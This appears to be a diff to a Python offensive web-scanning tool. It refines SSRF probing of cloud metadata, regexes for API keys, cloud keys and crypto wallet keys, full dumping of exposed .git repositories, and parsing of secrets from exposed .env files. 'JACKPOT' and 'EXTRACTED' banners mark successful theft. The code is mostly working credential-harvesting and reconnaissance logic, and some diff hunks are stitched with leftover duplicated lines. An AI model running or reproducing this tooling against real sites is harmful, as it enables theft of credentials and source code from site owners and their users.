+                                    location=f"{endpoint}?{param}=",
+                                    payload=payload_url,
+                                    evidence=str(extracted_data)[:300],
+                                    description=f"SSRF exposing {cloud_type} cloud metadata - VALIDATED format",
+                                    remediation="Validate URLs against whitelist, disable internal DNS resolution",
+                                    exploitable=True,
+                                    exploit_code=f"curl '{url}'"
+                                ))
+                                
+                                print(Colors.critical(f"\n      [💀 SSRF → {cloud_type}] {endpoint}?{param}= - METADATA FORMAT VALIDATED"))
+                                break  # Found valid SSRF, move to next param
+                        
+                        time.sleep(self.config.delay)
+                    except:
+                        pass
+        
+        return vulns
                                     cloud_type = 'gcp'
                                     extracted_data = {'metadata_keys': lines[:10]}
                             
@@ -1550,29 +1669,33 @@ class FoxReverseEngineeringToolkit:
         """
         Scan for sensitive patterns - STRICT FORMAT VALIDATION ONLY.
         Adapted from AOB (Array of Bytes) scanning technique.
+        REMOVED: Generic 32/40-char regex (caused false positives on build hashes)
         """
         vulns = []
         
-        # Patterns with STRICT validation functions
+        # Patterns with STRICT validation functions - NO GENERIC PATTERNS
         sensitive_patterns = [
-            # Stripe keys (very specific format)
+            # Stripe keys (very specific format - 24 chars after prefix)
             (r'sk_live_[A-Za-z0-9]{24}', 'STRIPE_SECRET_KEY', validate_stripe_key),
             (r'sk_test_[A-Za-z0-9]{24}', 'STRIPE_TEST_KEY', validate_stripe_key),
             (r'pk_live_[A-Za-z0-9]{24}', 'STRIPE_PUBLIC_KEY', validate_stripe_key),
             
-            # AWS credentials (exact format)
+            # AWS credentials (exact format - AKIA + 16 UPPERCASE)
             (r'AKIA[0-9A-Z]{16}', 'AWS_ACCESS_KEY', validate_aws_key),
             
-            # Google API keys
+            # Google API keys (AIza + 35 chars)
             (r'AIza[0-9A-Za-z_-]{35}', 'GOOGLE_API_KEY', validate_google_api_key),
             
-            # JWT tokens (must be decodable)
+            # JWT tokens (must be decodable with 3 parts)
             (r'eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}', 'JWT_TOKEN', validate_jwt_token),
             
             # Database connection strings (must have protocol + credentials)
             (r'mongodb(\+srv)?://[^:\s]+:[^@\s]+@[^\s/]+', 'MONGODB_URI', lambda x: '://' in x and '@' in x and ':' in x),
             (r'postgresql://[^:\s]+:[^@\s]+@[^\s/]+', 'POSTGRESQL_URI', lambda x: 'postgresql://' in x and '@' in x),
             (r'mysql://[^:\s]+:[^@\s]+@[^\s/]+', 'MYSQL_URI', lambda x: 'mysql://' in x and '@' in x),
+            
+            # Solana secret keys (exact format - array of 64 numbers)
+            (r'\[(?:\d{1,3},\s*){63}\d{1,3}\]', 'SOLANA_SECRET_KEY', lambda x: x.startswith('[') and x.endswith(']') and x.count(',') == 63),
         ]
         
         test_endpoints = [
@@ -2497,14 +2620,17 @@ class VulnerabilityScanner:
     # SENSITIVE ENDPOINT DISCOVERY + FULL GIT REPO RECONSTRUCTION
     # ─────────────────────────────────────────────────────────────────────
     def discover_sensitive_endpoints(self, target: str) -> List[Vulnerability]:
-        """Discover sensitive endpoints and files - WITH FULL GIT DUMP + SECRET EXTRACTION"""
+        """Discover sensitive endpoints and files - WITH STRICT .GIT + .ENV VALIDATION"""
         vulns = []
         
-        # PHASE 1: Check for .git directory exposure
+        # PHASE 1: Check for .git directory exposure with STRICT VALIDATION
         git_head_url = urljoin(target, '/.git/HEAD')
         try:
+            # Use GET, not HEAD, to validate content
             r = requests.get(git_head_url, timeout=5, allow_redirects=False)
-            if r.status_code == 200 and r.text.startswith('ref:'):
+            
+            # STRICT .git/HEAD validation: must start with "ref:" and contain "refs/"
+            if r.status_code == 200 and validate_git_file(r.text, '.git/HEAD'):
                 print(Colors.critical("\n    [🔥 JACKPOT] .git DIRECTORY EXPOSED - RECONSTRUCTING FULL REPO..."))
                 
                 # DUMP ENTIRE GIT REPOSITORY
@@ -2528,10 +2654,22 @@ class VulnerabilityScanner:
                 for git_file in git_files_to_dump:
                     try:
                         url = urljoin(target, git_file)
-                        r = requests.get(url, timeout=5, allow_redirects=False)
-                        if r.status_code == 200 and len(r.text) > 5:
-                            dumped_files[git_file] = r.text
-                            print(Colors.success(f"      [✓] Dumped: {git_file} ({len(r.text)} bytes)"))
+                        r_file = requests.get(url, timeout=5, allow_redirects=False)
+                        
+                        # Validate each git file format
+                        filename = git_file.split('/')[-1]
+                        git_path = '/'.join(git_file.split('/')[-2:])
+                        
+                        if r_file.status_code == 200 and len(r_file.text) > 5:
+                            # Validate .git/config format
+                            if 'config' in git_file and validate_git_file(r_file.text, '.git/config'):
+                                dumped_files[git_file] = r_file.text
+                                print(Colors.success(f"      [✓] Dumped: {git_file} ({len(r_file.text)} bytes)"))
+                            # Validate other files (less strict)
+                            elif 'config' not in git_file and len(r_file.text) > 5:
+                                dumped_files[git_file] = r_file.text
+                                print(Colors.success(f"      [✓] Dumped: {git_file} ({len(r_file.text)} bytes)"))
+                        
                         time.sleep(self.config.delay)
                     except:
                         pass
@@ -2545,20 +2683,25 @@ class VulnerabilityScanner:
                     secrets_found = {}
                     
                     secret_patterns = {
-                        'API_KEY': r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})',
-                        'PASSWORD': r'(?:password|passwd)["\']?\s*[:=]\s*["\']?([^\s"\'\n]{8,})',
-                        'TOKEN': r'(?:token|auth)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})',
-                        'AWS_KEY': r'(AKIA[0-9A-Z]{16})',
-                        'PRIVATE_KEY': r'(-----BEGIN.*PRIVATE KEY-----)',
-                        'DATABASE': r'(postgres|mysql|mongodb)://[^\s]+',
+                        'STRIPE_KEY': (r'(sk_live_[A-Za-z0-9]{24}|pk_live_[A-Za-z0-9]{24})', validate_stripe_key),
+                        'AWS_KEY': (r'(AKIA[0-9A-Z]{16})', validate_aws_key),
+                        'GOOGLE_API_KEY': (r'(AIza[0-9A-Za-z_-]{35})', validate_google_api_key),
+                        'PASSWORD': (r'(?:password|passwd)["\']?\s*[:=]\s*["\']?([^\s"\'\n]{8,})', lambda x: len(x) > 8),
+                        'PRIVATE_KEY': (r'(-----BEGIN.*PRIVATE KEY-----)', lambda x: 'PRIVATE KEY' in x),
+                        'DATABASE': (r'(postgres|mysql|mongodb)://[^\s]+', lambda x: '://' in x),
                     }
                     
-                    for secret_type, pattern in secret_patterns.items():
+                    for secret_type, (pattern, validator) in secret_patterns.items():
                         matches = re.findall(pattern, all_git_content, re.IGNORECASE)
-                        if matches:
-                            secrets_found[secret_type] = list(set(matches))[:3]  # Top 3 unique
+                        validated = []
+                        for match in matches:
+                            m_str = match if isinstance(match, str) else match[0]
+                            if not is_placeholder_value(m_str) and validator(m_str):
+                                validated.append(m_str)
+                        if validated:
+                            secrets_found[secret_type] = list(set(validated))[:3]  # Top 3 unique
                     
-                    evidence = f"Dumped {len(dumped_files)} git files"
+                    evidence = f"Dumped {len(dumped_files)} git files (validated .git/HEAD and .git/config formats)"
                     if secrets_found:
                         evidence += f" | Extracted secrets: {', '.join(secrets_found.keys())}"
                     
@@ -2569,33 +2712,70 @@ class VulnerabilityScanner:
                         description=f"Full .git repository exposed and reconstructed - {len(dumped_files)} files dumped",
                         evidence=evidence,
                         remediation="Block access to .git directory in web server config",
-                        exploitable=True
+                        exploitable=True,
+                        exploit_code="Use: git-dumper or GitHack to reconstruct full source"
                     ))
                     
                     print(Colors.critical(f"      [💀 EXTRACTED] {len(secrets_found)} secret types from git repo"))
         except:
             pass
         
-        # PHASE 2: Test for .env files with DEEP SECRET EXTRACTION
+        # PHASE 2: Test for .env files with STRICT KEY=VALUE VALIDATION
         env_files = ['/.env', '/.env.local', '/.env.production', '/.env.staging', '/.env.development']
         for env_file in env_files:
             try:
                 url = urljoin(target, env_file)
                 r = requests.get(url, timeout=5, allow_redirects=False)
                 
-                if r.status_code == 200 and '=' in r.text and not r.text.strip().startswith('<html'):
+                # STRICT .env validation: must be KEY=VALUE format, not HTML
+                if r.status_code == 200 and validate_env_file(r.text):
                     print(Colors.critical(f"\n    [🔥 JACKPOT] {env_file} EXPOSED - EXTRACTING ALL SECRETS..."))
                     
-                    # Parse .env file
+                    # Parse .env file with STRICT secret validation
                     env_secrets = {}
                     for line in r.text.split('\n'):
                         line = line.strip()
                         if '=' in line and not line.startswith('#'):
-                            key, value = line.split('=', 1)
-                            key = key.strip()
-                            value = value.strip().strip('"').strip("'")
-                            if len(value) > 5 and value not in ['', 'null', 'undefined', 'your_key_here']:
-                                env_secrets[key] = value
+                            try:
+                                key, value = line.split('=', 1)
+                                key = key.strip()
+                                value = value.strip().strip('"\'')
+                                
+                                if is_placeholder_value(value) or len(value) < 8:
+                                    continue
+                                
+                                # Validate specific formats
+                                if validate_stripe_key(value):
+                                    env_secrets[key] = f'STRIPE_KEY: {value[:20]}...'
+                                elif validate_aws_key(value):
+                                    env_secrets[key] = f'AWS_KEY: {value}'
+                                elif validate_google_api_key(value):
+                                    env_secrets[key] = f'GOOGLE_API_KEY: {value[:20]}...'
+                                elif validate_jwt_token(value):
+                                    env_secrets[key] = f'JWT_TOKEN: {value[:30]}...'
+                                elif len(value) > 20:
+                                    env_secrets[key] = f'SECRET ({len(value)} chars)'
+                            except:
+                                pass
+                    
+                    if env_secrets:
+                        vulns.append(Vulnerability(
+                            type="ENV_FILE_EXPOSED",
+                            severity="CRITICAL",
+                            location=env_file,
+                            description=f"{env_file} exposed with {len(env_secrets)} validated secrets",
+                            evidence='\n'.join([f"{k}: {v}" for k, v in list(env_secrets.items())[:10]]),
+                            remediation="Block access to .env files, rotate all exposed credentials",
+                            exploitable=True
+                        ))
+                        
+                        print(Colors.critical(f"      [💀 VALIDATED] {len(env_secrets)} secrets extracted"))
+                
+                time.sleep(self.config.delay)
+            except:
+                pass
+        
+        return vulns
                     
                     if env_secrets:
                         print(Colors.critical(f"      [💀 EXTRACTED] {len(env_secrets)} secrets from {env_file}:"))
